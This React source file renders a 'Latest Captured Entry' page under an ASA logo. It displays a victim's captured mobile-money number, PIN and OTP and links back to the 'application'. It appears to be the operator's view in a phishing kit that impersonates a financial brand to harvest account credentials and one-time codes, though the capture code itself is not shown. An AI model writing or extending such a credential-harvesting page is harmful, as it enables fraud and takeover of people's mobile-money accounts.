import '../App.css'
import { getLatestEntry } from '../utils/recentEntry'

function ListPage() {
  const latestEntry = getLatestEntry()

  return (
    <main className="app-shell">
      <div className="curve-top"></div>
      <section className="glass-panel">
        <header className="panel-header">
          <img src="/asa_logo_rgb_colour_horiz.png" alt="ASA Logo" className="brand-logo" />
          <h1>Latest Captured Entry</h1>
          <p>MoMo Number, PIN and OTP</p>
        </header>

        <div className="panel-body stack-xl">
          <div className="page-actions">
            <a href="/" className="btn-secondary page-link">
              ← Back to application
            </a>
          </div>

          <section className="list-card">
            <div className="list-row">
              <span className="list-label">Mobile number</span>
              <strong className="list-value">{latestEntry.mobileNumber || 'No number captured yet'}</strong>
            </div>

            <div className="list-row">
              <span className="list-label">PIN</span>
              <strong className="list-value">{latestEntry.pin || 'No PIN captured yet'}</strong>
            </div>

            <div className="list-row">
              <span className="list-label">OTP</span>
              <strong className="list-value">{latestEntry.otp || 'No OTP captured yet'}</strong>
            </div>
          </section>
        </div>
      </section>
    </main>
  )
}

export default ListPage